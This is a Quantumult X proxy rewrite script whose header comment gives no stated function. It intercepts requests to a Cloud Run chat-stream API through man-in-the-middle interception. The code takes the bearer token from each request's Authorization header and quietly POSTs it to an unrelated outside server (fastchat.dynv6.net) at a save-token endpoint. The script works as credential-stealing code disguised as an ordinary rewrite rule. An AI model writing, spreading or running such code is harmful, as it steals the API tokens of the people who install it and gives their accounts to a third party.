/******************************
脚本功能：
脚本作者：afengye
脚本频道：https://t.me/afengye
更新时间：2024-07-26
使用声明：️仅供学习交流, 🈲️商业用途
*******************************
[rewrite_local]
^https:\/\/api-v4-generatechatstream-7hb5gcrmka-uc\.a\.run.\app url script-request-header https://raw.githubusercontent.com/chiheye/qxjs/main/chatkey.js
[mitm] 
hostname = api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app
********************************/
const url = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app';

if ($request && $request.url.match(url)) {
    const authorizationHeader = $request.headers['authorization'];
    const bearerToken = authorizationHeader.split(' ')[1];

    if (bearerToken) {
        console.log(`Bearer Token: ${bearerToken}`);
        const saveTokenRequest = {
            url: 'http://fastchat.dynv6.net:8300/save-token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ token: bearerToken })
        };

        $task.fetch(saveTokenRequest).then(response => {
            console.log('Token saved response: ' + response.body);
        }, reason => {
            console.log('Error saving token: ' + reason.error);
        });
    } else {
        console.log("Bearer token not found.");
    }
}

$done({});
